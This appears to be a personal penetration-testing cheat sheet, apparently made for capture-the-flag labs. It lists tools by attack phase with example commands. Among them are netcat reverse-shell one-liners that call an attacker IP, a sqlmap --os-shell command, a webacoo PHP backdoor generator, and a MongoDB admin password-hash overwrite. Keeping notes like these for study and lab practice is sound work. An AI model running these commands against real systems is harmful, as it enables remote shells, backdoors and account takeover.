---
Title: Tools Organization
Description:
---

## Content

[***01 - Information Gathering***](#01---information-gathering): [💲Nmap](#nmap) - [💲Netcat (nc)](#netcat-nc), [💲Recon-NG](#recon-ng)

+ DNS Analytics:
  + repository: [📒💲Sist3r](https://github.com/aboul3la/Sublist3r)
  + Online Tool: [🌐Dnscan](https://www.nmmapper.com/sys/tools/subdomainfinder)
  + commandline tool: [💲anubis](https://pypi.org/project/anubis-netsec/), [💲amass](https://github.com/OWASP/Amass), [💲Nmap](#nmap)

+ Live Host Identification: 💲ping

[***02 - Vulnerability Analysis***](#02---vulnerability-analysis):[📦Nessus](#nessus), 📦Open VAS

[***03 - Web Application Analysis***](#03---web-application-analysis): 📦OWASP ZAP, 📦burpsuite, [💲sqlmap](sqlmap)

+ Web Crawlers & Directory Bruteforce: [💲gobuster](#gobuster), [💲ffuf](#ffuf), [📒💲dirsearch](#dirsearch)
+ Web Vulnerability Scanners: [💲whatweb](#whatweb)

[***05 - Password Attacks***](#05---password-attacks): [💲John](#john), [💲zip2john](#zip2john)

+ Online Attacks: [💲hydra](#hydra)
+ Offline Attacks: [💲hashid](#hashid)
+ Other: [💲mkpasswd](#mkpasswd)

[***07 - Reverse Engineering***](#07---reverse-engineering): [💲jd-gui](#jd-gui)

[***09 - Sniffing & Spoofing***](#09---sniffing--spoofing): 💲responder, 💲tcpdump, 📦wireshark

[***10 - Post Exploitation***](#10---post-exploitation): 💲evil-winrm

+ Web Backdoors: [💲webacoo](#webacoo)

[***14 - System Services***](#14---system-services): [💲MetaSploit](#metasploit)

[***Usual Applications***](#usual-applications): [#PowerShell(pwsh)](#powershellpwsh)

<!-- 
[***Website Vulnerability Scan***](#website-vulnerability-scan): Acunetix Web Vulnerability Scanner (AWVS)
***Passive***:
[***DNS***](#dns): whois, nslookup, host, dig, fierce, DNSenum, DNSrecon, Sublist3r, dnsdumpster
[***Web Reconnaissance***](#web-reconnaissance): Google Hacking, Google Map, shadon, Recon-ng
[***Git***](#git): Github/Gitlab, scrabble, GitHack
[***Email***](#email): theHarvester
***Active***
[***Network Service***](#network-service): Netdiscover, Netdiscover
[***SNMP***](#snmp): Onesixtyone, SNMPwalk
[***Samba***](#samba): rpcclient, enum4linux
[***Web***](#web): Nikto, DRIB, Dirbuster, WPScan
 -->

[***Storage Service***](#storage-service): [💲AWS-S3](#aws-s3), 💲mysql, 💲redis-cli, [💲smbclient](#smbclient), [💲mongo](#mongo), [💲tftp](#tftp)

[***File & Data***](#file--data): ASCII, 💲base64, [💲exiftool](#exiftool)

[***Useful Repository***](#useful-repository): [📒SecLists](#seclists)

[***Useful Website***](#useful-website)

## 01 - Information Gathering

### DNS Analytics

+ [Subdomain finder - 9 Enumerating tools hosted online](https://www.nmmapper.com/sys/tools/subdomainfinder/)
+ [Kali linux most used subdomain finder - Ethical-tools](https://ethicaltools.gitbook.io/subdomainfinder/)

#### ping

```cmd
New-Object System.Net.Sockets.TCPClient -Argument "rpi4.shdennlin.com","80"
```

### nmap

<https://nmap.org/>

`sudo nmap --top-ports 3000  -F -sS -sC -sV -n -T4 ${ip}`

> -F: Fast mode - Scan fewer ports than the default scan
>
> -sS (TCP SYN scan)
> SYN scan is the default and most popular scan option for good reasons. It can be
> performed quickly, scanning thousands of ports per second on a fast network not
> hampered by restrictive firewalls.
>
> -sC: Performs a script scan using the default set of scripts. It is equivalent to --
> script=default. Some of the scripts in this category are considered intrusive and
> should not be run against a target network without permission.
>
> -sV: Enables version detection, which will detect what versions are running on what port.
>
> -n (No DNS resolution)
>
> -T4 prohibits the dynamic scan delay from exceeding 10 ms for TCP ports

***dns-brute***
`nmap --script dns-brute <dns>`

#### NetCat (nc)

Netcat is a versatile utility for working with TCP or UDP data.

``` shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.18.0.1 1337 > /tmp/f; rm /tmp/f
nc -nlvp 1337

rm /tmp/f; mkfifo /tmp/f; nc <attack IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

***Translate File***

``` shell
# receive side
sudo nc -lp <port> > <file_name>

# transfer side
nc -v -w 3 <ip> <port> < <file_name>
## windows
type <file_name> | nc.exe -l -p 3333   
```

+ [Netcat（Linux nc 指令）網路管理者工具實用範例](https://blog.gtwang.org/linux/linux-utility-netcat-examples/)

### Recon-NG

+ [Recon-NG Tutorial | HackerTarget.com](https://hackertarget.com/recon-ng-tutorial/)

## 02 - Vulnerability Analysis

### Nessus

+ [How to Get Started with Nessus on Kali Linux | Tenable®](https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux)

## 03 - Web Application Analysis

### gobuster

directory/file enumeration mode

+ `gobuster dir --url $url --wordlist $tool/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 30`

VHOST enumeration mode

+ `gobuster vhost -w ../../tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb`

### ffuf

``` shell
ffuf -u <url> -w <wordlist.txt>  -H "Host: FUZZ.<url>"                             

```

### dirsearch

<https://github.com/maurosoria/dirsearch>

### sqlmap

``` shell
sqlmap -u "http://<ip>/dashboard.php?search=any+query" --cookie="" --os-shell
```

### whatweb

``` shell
whatweb -v -a 3 <url>
```

## 05 - Password Attacks

### john

Password cracker.

`john -w=rockyou.txt hash.txt`

### hashid

``` shell
hashid <hash>

hashcat -a 0 -m 0 <hash.txt> /usr/share/eaphammer/wordlists/rockyou.txt
```

### zip2john

`zip2john XXX.zip > hash`

### hydra

### wfuzz

``` shell
wfuzz --sc 200 -w num.txt -H "Cookie: user=FUZZ; role=guest"  http://10.129.81.172/uploads/
```

> --sc 200: only show the response with status code 200

### mkpasswd

``` shell
mkpasswd -m sha-512 password
```

## 07 - Reverse Engineering

### jd-gui

`jd-gui XXX.jar`

## 09 - Sniffing & Spoofing

## 10 - Post Exploitation

### webacoo

php RCE

``` shell
# Gerenate
webacoo -g -o test.php 

# connect server
webacoo -t -u http://<url>/test.php
```

+ [Kali 2.0 Web后门工具----WebaCoo、weevely、PHP Meterpreter - LxRo_UX - 博客园](https://www.cnblogs.com/aq-ry/p/9940830.html)

## 14 - System Services

### MetaSploit

``` shell
sudo msfconsole
msf6 > search xxx
msf6 > use xxx
msf6 xxx(xxx) > show options
msf6 xxx(xxx) > set XX xxx
msf6 xxx(xxx) > run

```

## Usual Applications

### PowerShell(pwsh)

```shell
# Start a Remote Session
Enter-PSSession -ComputerName COMPUTER -Credential USER -Authentication Negotiate
```

+ <https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters>

## Storage Service

### AWS-S3

+ `aws configure`
+ `aws s3 ls`

### smbclient

+ `smbclient --no-pass -L //${ip}`

> -L: list
> -U: user

+ `smbclient --no-pass //${ip}/<Folder>`

### mongo

``` shell
mongo --host 127.0.0.1:27117
db.adminCommand( { listDatabases: 1 })
use <db>
db.admin.find().forEach(printjson);
db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"<SHA_512 Hash Generated>"}})'
```

### tftp

```shell
tftp <ip>

```

## File & Data

### ASCII

+ convert ASCII values into ASCII characters: \
  `echo "65 66 67" | awk '{ for(i=1;i<=NF;i++) printf("%c",$i); print "";  }'`

### base64  

Encode or decode file or standard input to/from Base64, to standard output. \
More information: <https://www.gnu.org/software/coreutils/base64>.

+ Encode the contents of a file as base64 and write the result to stdout: \
  `base64 filename`

+ Decode the base64 contents of a file and write the result to stdout: \
  `base64 --decode filename`

+ Encode from stdin: \
  `<command> | base64`

+ Decode from stdin: \
  `<command> | base64 --decode`

### exiftool  

Read and write meta information in files. \
More information: <https://exiftool.org.>.

## Useful Repository

### SecLists

<https://github.com/danielmiessler/SecLists>

SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.

### pspy

<https://github.com/DominicBreuker/pspy>

Monitor linux processes without root permissions

## Useful Website
